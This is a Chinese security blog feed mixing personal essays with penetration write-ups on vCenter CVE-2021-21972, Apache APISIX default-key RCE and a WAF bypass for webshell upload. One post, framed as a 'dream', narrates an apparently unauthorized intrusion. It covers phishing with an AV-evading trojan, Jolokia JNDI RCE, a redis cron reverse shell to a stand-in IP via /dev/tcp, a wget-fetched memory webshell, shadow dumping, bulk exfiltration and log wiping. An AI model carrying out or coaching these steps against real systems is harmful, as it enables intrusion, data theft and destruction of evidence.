alt="image-20220619004532359"></p><p>可控制数十个镜像</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225771.jpg" alt="image-20220619001950533"></p><p>核心区VCenter存在CVE-2021-21972漏洞，可直接写入Webshell</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225132.jpg" alt="image-20220619002143315"></p><p>随后可利用Vcenter的shell权限实现cookie伪造</p><p>使用脚本</p><p><a href="https://github.com/horizon3ai/vcenter_saml_login/blob/main/vcenter_saml_login.py">https://github.com/horizon3ai/vcenter_saml_login/blob/main/vcenter_saml_login.py</a></p><pre><code class="shell">python3 vcenter_saml_login.py -t Vcenter内网ip -p data.mdb</code></pre><pre><code>data.mdb路径windows：C:/ProgramData/VMware/vCenterServer/data/vmdird/data.mdblinux：/storage/db/vmware-vmdir/data.mdb</code></pre><p>使用生成的cookie进驻VCenter</p><p>分数刷满，润了~</p><h2 id="0x06-末言"><a href="#0x06-末言" class="headerlink" title="0x06 末言"></a>0x06 末言</h2><p>本文没有过多的技术性东西，主要是跟大家分享一下自己打攻防被”围追堵截“的经典案例，给奋斗在攻防一线的兄弟加油鼓劲</p><p>权限掉了，被踢出内网，莫要灰心气馁，<strong>见招拆招，才是攻防的乐趣所在</strong></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(九)-巧用目标域名特点挖掘某新上SRC四处RCE</title>
      <link href="/2023/02/22/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%B9%9D-%E5%B7%A7%E7%94%A8%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D%E7%89%B9%E7%82%B9%E6%8C%96%E6%8E%98%E6%9F%90%E6%96%B0%E4%B8%8ASRC%E5%9B%9B%E5%A4%84RCE/"/>
      <url>/2023/02/22/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%B9%9D-%E5%B7%A7%E7%94%A8%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D%E7%89%B9%E7%82%B9%E6%8C%96%E6%8E%98%E6%9F%90%E6%96%B0%E4%B8%8ASRC%E5%9B%9B%E5%A4%84RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x02-缘起"><a href="#0x02-缘起" class="headerlink" title="0x02 缘起"></a>0x02 缘起</h2><p>早上打开微信无聊水群，偶然间发现新上了家SRC</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223925.png" alt="image-20230222002842186"></p><p>新上的SRC一般都是细皮嫩肉的处子，未经万人骑，得手也更加容易，我们来一探究竟</p><h2 id="0x03-资产搜集到默认秘钥被改-山穷水尽"><a href="#0x03-资产搜集到默认秘钥被改-山穷水尽" class="headerlink" title="0x03 资产搜集到默认秘钥被改 山穷水尽"></a>0x03 资产搜集到默认秘钥被改 山穷水尽</h2><p>简单用目标的cert信息收集了一下网络空间的资产</p><p>发现了目标不少的域名都采用“短横线命名法”，一般来说大厂用这种命名法便于分辨开发、测试、生产环境还是蛮多的</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223938.jpg" alt="0956758F-07AE-43B8-8921-ECE12FE26002.png"></p><p>总结了一下，常见的开发、测试、生产环境域名中常见词如下</p><pre><code>uattestdevpreprpro...</code></pre><p>随后从资产列表中找到了一个看起来像管理api接口的域名进行访问</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223978.png" alt="image-20230222000155876"></p><p>根据页面回显，结合之前多年的测试经验，推断此处使用了Apache Apisix</p><p>之前复现过Apache Apisix默认秘钥添加恶意路由导致的RCE漏洞，此处直接准备一试</p><p>发现直接寄了，目标<strong>生产环境</strong>的api把这个默认的key给改掉了，导致没法创建恶意路由</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223525.png" alt="image-20230222000627789"></p><p>难道就这样结束了？那显然不符合我们的风格</p><h2 id="0x04-理顺思路-发现隐藏的测试环境资产"><a href="#0x04-理顺思路-发现隐藏的测试环境资产" class="headerlink" title="0x04 理顺思路-发现隐藏的测试环境资产"></a>0x04 理顺思路-发现隐藏的测试环境资产</h2><p>刚刚我们在进行资产搜集时，已经发现了目标域名的统一命名特点</p><p>那么我们完全可以借助FUZZ域名来搞出一点火花，尝试发掘隐藏资产</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223502.png" alt="image-20230222001842874"></p><pre><code class="shell">./ffuf -w domain_test -u https://gateway-xxx-xxx-FUZZ.xxx.com -mc 404 -t 1</code></pre><p>最终成功发现按照目标的目标的四处非生产环境的隐藏资产</p><h2 id="0x05-测试环境默认key的原罪到RCE"><a href="#0x05-测试环境默认key的原罪到RCE" class="headerlink" title="0x05 测试环境默认key的原罪到RCE"></a>0x05 测试环境默认key的原罪到RCE</h2><p>随后在下面四个隐藏子域尝试默认key添加恶意lua路由，发现均成功</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223697.png" alt="image-20230222002214957"></p><p>添加恶意路由后，就是一马平川，直捣黄龙了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223724.png" alt="image-20230222002331575"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192223274.png" alt="image-20230222002411093"></p><p>目标是运行在k8s上的，掐指一算应该是测试环境用了默认key的老镜像，运维也没做修改，导致了RCE的大锅</p><p>交完四处命令执行，奖励自己晚上吃鸡蛋肠粉加根肠</p><h2 id="0x06-技术点总结"><a href="#0x06-技术点总结" class="headerlink" title="0x06 技术点总结"></a>0x06 技术点总结</h2><p>结合目标域名命名特点，发现隐藏的开发、测试环境资产</p><p>完成新突破</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年小记 - 这世界那么多人</title>
      <link href="/2022/12/29/2022%E5%B9%B4%E5%B0%8F%E8%AE%B0-%E8%BF%99%E4%B8%96%E7%95%8C%E9%82%A3%E4%B9%88%E5%A4%9A%E4%BA%BA/"/>
      <url>/2022/12/29/2022%E5%B9%B4%E5%B0%8F%E8%AE%B0-%E8%BF%99%E4%B8%96%E7%95%8C%E9%82%A3%E4%B9%88%E5%A4%9A%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这世界有那么多人 </p><p>人群里 敞着一扇门 </p><p>我迷朦的眼睛里长存 </p><p>初见你 蓝色清晨</p><p>莫文蔚《这世界那么多人》</p></blockquote><p><strong>这世界那么多人</strong></p><p><a href="https://music.163.com/#/song?id=1842025914&market=baiduqk">https://music.163.com/#/song?id=1842025914&amp;market=baiduqk</a></p><p>音乐：莫文蔚 - 这世界那么多人 (电影《我要我们在一起》主题曲)<img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192330605.jpg" alt="img"></p><p>本文建议打开上方的音乐后阅读🎵</p><p>走过一年烟雨，后天除夕将至，面对一张白纸，无语凝噎，不知从何下笔，姑且从自己的一点杂感说开去。</p><p>经济衰退的时代背景下，覆巢之下无完卵，2022年也许是很多人事业和精神上颇为艰难的一年，笔者也不例外。加冠之年的自己，经历了股票大跌，安全行业业务订单量骤减，R2风险无亏损记录的理财产品出现亏损，新冠封控与放开带来的双重精神施压（笔者的支气管和肺多年前一直有老毛病在身）。精神与物质的双重困扰，让临近年末的笔者像极了那被锤了的牛，劳神苦思也只能落得一个黯然神伤的结尾。</p><p>尤记得今年年初之时，自己手上的电脑刚刚到货，感觉一切未来可期，可谓春风得意马蹄疾，感觉自己像极了王小波《黄金时代》里面那片皎洁月光下的人，万类霜天竞自由，爱我所爱，行我所行，什么都锤不了自己。可惜事实还是更像这段</p><blockquote><p>那一天我二十一岁，在我一生的黄金时代。我有好多奢望。我想爱，想吃，还想在一瞬间变成天上半明半暗的云。后来我才知道，生活就是个缓慢受锤的过程，人一天天老下去，奢望也一天天消失，最后变得像挨了锤的牛一样。可是我过二十一岁生日时没有预见到这一点。我觉得自己会永远生猛下去，什么也锤不了我。</p><p>王小波《黄金时代》</p></blockquote><p>   那年我双手插兜，却被打的不知怎么还手。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192330678.jpeg" alt="图片"></p><p>​    2022也参加了不少比赛，有技术比赛，也有创新创业比赛，出了不错的成果，拿过不错的名次，收获了一堆不知道有啥用的证书、奖杯。回首看来这些东西的价值并不比擦屁股纸高多少，颇有一种“三十功名尘与土”的感觉。回家过年把攒了一年的优质“茅房纸”放到自己的书架上，偶然间发现自己从各家甲乙方平台和SRC收集而来的小手办已有如此之多，寒冬腊月里感慨万分。</p><p>PS：大家可以看看能认出多少图中手办对应的厂商</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192330968.png" alt="图片"></p><p>​    从2015年的第一个漏洞至今，已有八年，每一个小手办记录着那段回不去的时光，记录着我与漏洞的前尘往事，记录着我与这世上那么多人的萍水相逢，让人温暖又幸福。</p><p>​    尤记得今年是腾讯安全应急响应中心成立的第十年，自己今天打扫书架时，找到了TSRC五周年时送来的那款八音盒，扭动按钮，里面缓缓播放出《天空之城》。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192330087.png" alt="图片"></p><p>​    </p><p>​    前尘隔海，古屋不再，重启八音盒，思绪如泉涌。恍觉人生在世纵然不称意，与有情有义之人的萍水相逢，能够在自己热爱的领域发光发热、深耕其中便是最大的慰藉，最大的人间值得。</p><p>​    不同于八音盒的诉说，身旁那么多人，可世界不声、不响。</p><p>​    回望这些年浮生于世，我一直把自己的理想与使命定位于：和一帮有情有义的人，共同做一件有价值的事，而这件事最终能改变中国乃至世界的网络安全行业。我隐约感受到，自己离践行使命的机会已经不再遥远。也许明天不会更好，但是请相信，明天会有践行自身价值的更好机会。</p><p>​    </p><p>​    致过去、现在、未来的同行者们，过往的阴霾终会散去，让我们一同拥抱滚烫的明天，即将到来的2023！</p><p>​    感谢读到这里的你，言尽于此，让我们江湖再会。</p><p>​                                                    </p><p>​                                      J0o1ey于2022年12月29日18:00</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活偶悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(八)-梦中绝杀某脖代理商后台</title>
      <link href="/2022/03/15/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%85%AB-%E6%A2%A6%E4%B8%AD%E7%BB%9D%E6%9D%80%E6%9F%90%E8%84%96%E4%BB%A3%E7%90%86%E5%95%86%E5%90%8E%E5%8F%B0/"/>
      <url>/2022/03/15/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%85%AB-%E6%A2%A6%E4%B8%AD%E7%BB%9D%E6%9D%80%E6%9F%90%E8%84%96%E4%BB%A3%E7%90%86%E5%95%86%E5%90%8E%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>前两天在国企的朋友遇到了一个棘手的靶标，听说之前没人能从外网打点进去，只能靠万里防火墙取证</strong></p><p><strong>我一听来了兴趣，在梦中臆造了一个靶场进行渗透，并且该梦境已获得相关授权</strong></p><p><strong>还请各位看官请勿对号入座，如有雷同，纯属巧合</strong></p><h2 id="0x01-钓鱼打点"><a href="#0x01-钓鱼打点" class="headerlink" title="0x01 钓鱼打点"></a>0x01 钓鱼打点</h2><p>官网发现了客服联系方式</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220437.jpg" alt="image-20220316104511285"></p><p>通过修改 shellcode特征的CS + 免杀加载器，直接做出免杀🐴。</p><p>改后缀名为非exe(懂的都懂)，直接用话术钓鱼客服(现在客服都聪明了，直接exe是肯定钓不到的)，获得其桌面记事本</p><p>记事本中翻出来了后台地址，但是并没有账号密码(有也没有用，因为有Google验证码)</p><p><a href="http://xxxxx/xxxxx-admin/">http://xxxxx/xxxxx-admin/</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220783.jpg" alt="image-20220316105840446"></p><h2 id="0x02-FUZZ得到Spring-Actuator泄露，并分析信息"><a href="#0x02-FUZZ得到Spring-Actuator泄露，并分析信息" class="headerlink" title="0x02 FUZZ得到Spring Actuator泄露，并分析信息"></a>0x02 FUZZ得到Spring Actuator泄露，并分析信息</h2><p>FUZZ了一下，出了二级目录Spring Actuator的泄露</p><p><a href="http://xxxxx/xxxxx-admin/actuator/">http://xxxxx/xxxxx-admin/actuator/</a></p><p>发现了老朋友jolokia</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220148.jpg" alt="image-20220314225017970"></p><p>jolokia组件，熟悉Spring测试的兄弟都知道，不出意外可以直接秒~</p><p>又访问了几个常见的端点</p><p><a href="http://xxxxx/xxxxx-admin/actuator/env">http://xxxxx/xxxxx-admin/actuator/env</a></p><p>通过env端点可知，该后台托管在亚马逊云，并且没有泄露ak，sk等信息</p><p>翻来覆去，只看到有个redis的密码</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220553.jpg" alt="image-20220316103343362"></p><p>看了下beans端点，并没有找到能用来直接dump出星号密码的合适Mbean，所以放弃直接通过jolokia调用mbean获取明文</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220950.jpg" alt="image-20220316120045893"></p><p><a href="http://xxxxx/xxxxx-admin/actuator/heapdump">http://xxxxx/xxxxx-admin/actuator/heapdump</a></p><p>通过下载heapdump，进入Mat分析</p><pre><code>select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220476.jpg" alt="image-20220316111928566"></p><p>调试后发现redis配置的链接地址是127.0.0.1，密码为空，但是并没有开放端口外链，那只能先留着了</p><h2 id="0x03-Jolokia-Realm-JNDI注入-rce"><a href="#0x03-Jolokia-Realm-JNDI注入-rce" class="headerlink" title="0x03 Jolokia Realm JNDI注入 rce"></a>0x03 Jolokia Realm JNDI注入 rce</h2><p><a href="https://xxxx/xxxxx-admin/actuator/jolokia/">https://xxxx/xxxxx-admin/actuator/jolokia/</a></p><p>根据得到jolokia端点</p><p>直接RCE打试试</p><p>利用条件为：</p><ul><li>目标网站&#x2F;jolokia&#x2F;list 接口存在 type&#x3D;MBeanFactory 和 createJNDIRealm 关键词 </li><li>请求可出外网</li></ul><p>命令编码地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a> </p><p>编码反弹Shell的命令</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220063.jpg" alt="image-20220314225702388"></p><p>用JNDI-Injection-Exploit直接起个恶意Rmi服务</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “command” -A vps_ip</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220531.jpg" alt="image-20220316105555152"></p><p>直接修改好脚本</p><p><a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220057.jpg" alt="image-20220314231220102"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220456.jpg" alt="image-20220314232723932"></p><p>运气不错，目标出网，直接秒了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220889.jpg" alt="image-20220316120905094"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220354.jpg" alt="image-20220315000605462"></p><p>www权限</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220869.jpg" alt="image-20220316122240804"></p><h2 id="0x04反弹shell后的取证"><a href="#0x04反弹shell后的取证" class="headerlink" title="0x04反弹shell后的取证"></a>0x04反弹shell后的取证</h2><p>history，last、hosts，中间件日志等常规取证就不说了</p><p>目标的运维还是比较谨慎的，没有直连，而是以一台亚马逊云的主机为跳板进行SSH链接</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220161.jpg" alt="image-20220316123029874"></p><p>进程看了一下，web程序用的是MVC架构</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220141.jpg" alt="image-20220316122758785"></p><h2 id="0x05-注入内存🐴"><a href="#0x05-注入内存🐴" class="headerlink" title="0x05 注入内存🐴"></a>0x05 注入内存🐴</h2><p>为了防止反弹的Shell随时GG，所以选择注个内存马到Tomcat</p><p>比较恶心的是目标用的MVC架构，路由默认都是直接302跳转后台的路由，导致不少内存马没法直接用，时间紧急，去Git翻了一个agent型的内存马</p><p><a href="https://github.com/WisteriaTiger/JundeadShell">https://github.com/WisteriaTiger/JundeadShell</a></p><p>直接受控机梭哈</p><pre><code class="shell">wget x.x.x.x:50000/agent_starter.jarnohup java -jar agent_starter.jar &quot;java_process_name&quot; 8 &amp;</code></pre><p>挂上Burp访问靶标，找到了个不302跳转的接口，加上密码，访问内存马成功</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220502.jpg" alt="image-20220316124212144"></p><h2 id="0x06-借用redis权限提升"><a href="#0x06-借用redis权限提升" class="headerlink" title="0x06 借用redis权限提升"></a>0x06 借用redis权限提升</h2><p>目标为www权限，而且用的亚马逊云，及时打了补丁，最近的番号pkexec，dirty pipe等测试后不好使，脏牛等老古董更不行</p><p>GUID，SUID查了一遍，没有误配</p><p>最后都快放弃的时候看了一眼进程，redis是以root权限运行的…天助我也</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220122.jpg" alt="image-20220316143058190"></p><p>直接通过端口转发程序把redis的端口转发到本地</p><p>利用redis写计划任务</p><p>（PS:Ubuntu下会因为夹杂了脏数据导致语法无法识别而任务失效；但对于centos系统则没有影响，可以成功被利用，靶标为centos）</p><pre><code class="shell">echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n&quot;|redis-cli -h xx.xx.xx.xx -x set 1 #设定值redis-cli -h xx.xx.xx.xx config set dir /var/spool/cron/redis-cli -h xx.xx.xx.xx config set dbfilename rootredis-cli -h xx.xx.xx.xx save</code></pre><p>nc监听本地，没过一会，root权限的shell就弹回来了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220392.jpg" alt="image-20220316140326981"></p><p>随后又把shadow导出，取证了root用户目录下的部分东西，做了部分权限维持</p><h2 id="0x07-文件取证资料回传"><a href="#0x07-文件取证资料回传" class="headerlink" title="0x07 文件取证资料回传"></a>0x07 文件取证资料回传</h2><p>把取证好的网站Jar包，目录日志，登陆日志打包好，足足有几个G，回传文件成了难事</p><pre><code>tar -cvf xxxx.tar *</code></pre><p>尝试了nc，后门回传等均不稳定中途回传断掉，自己的oss那时候也过期了，没法通过oss回传，难受的一逼..</p><p>最终问了下小圈里的师傅，提供了一个好用的思路</p><p>利用奶牛快传回传文件</p><p><a href="https://github.com/Mikubill/cowtransfer-uploader">https://github.com/Mikubill/cowtransfer-uploader</a></p><pre><code class="shell">nohup ./cowtransfer-uploader -c &quot;remember-mev2=...;&quot; -a &quot;&lt;cow-auth-token&gt;&quot; xxx.tar</code></pre><p>速度很舒服，大概上传速度能到每秒6M</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220949.jpg" alt="image-20220316151652403"></p><p>随后直接去自己的奶牛快传下载即可</p><h2 id="0x08-资料分析"><a href="#0x08-资料分析" class="headerlink" title="0x08 资料分析"></a>0x08 资料分析</h2><p>把回传回来的jar包反编译，取证其中的数据库链接信息，等待下步指示</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220310.jpg" alt="image-20220316153837863"></p><p>分析程序记录的Log日志，后台登陆信息、账号、登陆IP尽收眼底；站在暗处的违法分子命不久矣</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220803.jpg" alt="image-20220316154212116"></p><h2 id="0x09-擦屁股与后言"><a href="#0x09-擦屁股与后言" class="headerlink" title="0x09 擦屁股与后言"></a>0x09 擦屁股与后言</h2><p>随后把web当日日志，history，&#x2F;var&#x2F;log下的日志全部清理干净</p><p>用到的工具全部wipe删掉</p><p><strong>断掉shell链接的一瞬间，我醒了，发现这一切竟是我在做梦</strong></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(七)-记一次与飞塔流量检测对抗的文件上传</title>
      <link href="/2022/03/10/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%83-%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8E%E9%A3%9E%E5%A1%94%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%AF%B9%E6%8A%97%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/03/10/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%83-%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8E%E9%A3%9E%E5%A1%94%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%AF%B9%E6%8A%97%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h2><p>某项目靶标，是一个人员管理系统，通过webpack暴露的接口</p><p>我们成功找到了一个未鉴权的密码修改接口，通过fuzz</p><p>我们获取到了该接口的参数username与password，并成功修改了admin账号密码进入后台</p><p>在一个任意上传的后台功能点，我们遇到了飞塔WAF+流量检测设备，于是便有了本文</p><h2 id="0x02-摸清检测规则"><a href="#0x02-摸清检测规则" class="headerlink" title="0x02 摸清检测规则"></a>0x02 摸清检测规则</h2><p>众所周知，飞塔公司的WAF+流量检测设备还是比较牛逼的，我直接尝试上传一个免杀webshell，毫无疑问直接GG了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217586.png" alt="image-20220310205117609"></p><p>经过测试，上传无害内容1111但文件名为XXX.aspx也会被拦截</p><p>发现飞塔对form表单的文件名和文件内容都有检测，我们必须得把这俩检测都安排掉才能成功上传</p><p>下面简述一下对抗思路</p><h2 id="0x03-文件名检测——根据-NET上传匹配文件名特性绕WAF-骗"><a href="#0x03-文件名检测——根据-NET上传匹配文件名特性绕WAF-骗" class="headerlink" title="0x03 文件名检测——根据.NET上传匹配文件名特性绕WAF(骗)"></a>0x03 文件名检测——根据.NET上传匹配文件名特性绕WAF(骗)</h2><p>.NET中常用<strong>context.Request.Files</strong>处理文件上传表单</p><p>其在匹配上传文件名时只匹配<strong>Content-Disposition:<strong>后的</strong>filename&#x3D;xxxx</strong>，这就给了我们很大的绕WAF操作空间，可以直接在Content-Disposition中注入脏数据来扰乱WAF的检测</p><p>这里我去掉分号，并使用emoji宽字节数据扰乱waf</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217557.png" alt="image-20220310171505081"></p><p>如图，使用无害数据成功上传aspx文件</p><h2 id="0x04-文件内容检测——双图片夹恶意代码-偷袭"><a href="#0x04-文件内容检测——双图片夹恶意代码-偷袭" class="headerlink" title="0x04 文件内容检测——双图片夹恶意代码(偷袭)"></a>0x04 文件内容检测——双图片夹恶意代码(偷袭)</h2><p>前面既然直接传免杀Shell不行，我又测试了加入图片头，尝试绕过检测</p><p>例如：</p><pre><code>JPEG (jpg)，文件头：FFD8FFPNG (png)，文件头：89504E47GIF (gif)，文件头：47494638</code></pre><p>发现并没有什么卵用，都GG了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217136.png" alt="image-20220310205919300"></p><p>后面根据.NET特性，使用了UTF-16编码，也被拦截了，看来飞塔对编码这块有所防范。</p><p><strong>今天是肯德基疯狂星期四</strong>，突然一个想法，在我脑中闪过——<strong>“我们能不能在万绿丛中夹带一点红呢”</strong></p><p><strong>我们来试试“汉堡包法”</strong></p><p>选取两张正常图片数据，中间夹带上我们的恶意代码</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217689.png" alt="image-20220310210818611"></p><p>如图，成功上传带有恶意代码的aspx文件，飞塔就此告破~</p><p>翻了一下后台的图片路径，成功拼接出shell的url路径</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217182.png" alt="image-20220310211332520"></p><p>蚁剑加密一下流量，成功Getshell</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217166.png" alt="image-20220310211449176"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>善用编码、宽字节，熟知每种开发语言的特性，是绕过WAF不可或缺的基本功</p><p>特殊情况下，思路灵活可以出奇制胜~</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《世上并不存在的歌》</title>
      <link href="/2022/01/08/%E3%80%8A%E4%B8%96%E4%B8%8A%E5%B9%B6%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%AD%8C%E3%80%8B/"/>
      <url>/2022/01/08/%E3%80%8A%E4%B8%96%E4%B8%8A%E5%B9%B6%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%AD%8C%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>身处疫情肆虐的西安，前两日晚上，依稀听到隔壁有人在唱歌，唱的声音不大，但很深情。歌词是这样的——</p><p><strong>“</strong></p><p><strong>我们再也没见过</strong></p><p><strong>可我一直都记得&#x2F;这首世上并不存在的歌</strong>**</p><p><strong>也许你已经忘了&#x2F;这个无心的过错&#x2F;却在我心里越来越深刻</strong>**</p><p><strong>”</strong></p><p><strong>世界上不存在的歌CD剧照</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318989.jpg" alt="img"></p><p>去QQ音乐搜了一下歌词，得知这首歌名为《世界上不存在的歌》，同时惊讶地发现原来是赵英俊的歌，那位已经去世的音乐人。我回想起去年元旦，自己正和女朋友在电影院里看《送你一朵小红花》。</p><p>这部电影以两个家庭的抗癌生活为主线，思考和直面了每一个人都会面临的人生命题。先前看过很多以疾病为题材上升到人生哲学的文章与电影，我对电影本身的剧情并不过敏，但却深深地被这部电影的同名片尾曲《送你一朵小红花》所打动。</p><p>后面我把这首歌加到了歌单里，两个月后，微博热搜——歌手赵英俊患癌去世。</p><p>他留个世界的最后一条微博是这样写的</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318103.png" alt="图片"></p><p>面对死亡之时，又有几人能保持这般的潇洒与释然呢？</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318123.png" alt="图片"></p><p>这个问题把我的回忆带回了几年前，那时高中文艺汇演，我们一层楼的四个班合出了一台节目，名叫《东坡突围》，整个节目以苏轼的赤壁赋为基，以余秋雨的《东坡突围》为引，通过主客问答体展现了苏轼在“乌台诗案”后内心的挣扎以及对生命的思考。而我，就是剧中的东坡，那时日日朗诵《前赤壁赋》与《临江仙·夜归临皋》，让我对此段历史与文学创作格外刻骨铭心，</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318238.jpg" alt="img"></p><p>  古来之时苏东坡于文赤壁感叹“<strong>寄蜉蝣于天地，渺沧海之一粟。哀吾生之须臾，羡长江之无穷。</strong>”意指人生在世，如同蜉蝣置身于广阔的天地中,像沧海中的一粒栗米那样渺小，人的一生终究只是短暂的片刻,而羡慕长江的奔流不息，没有穷尽。</p><p>而赵英俊在他的歌中是这样写的——</p><p><strong>“是谁挥霍的时光啊</strong></p><p> <strong>是谁苦苦的奢望啊，</strong></p><p> <strong>这不是一个问题，</strong></p><p> <strong>也不需要你来回答”</strong></p><p> 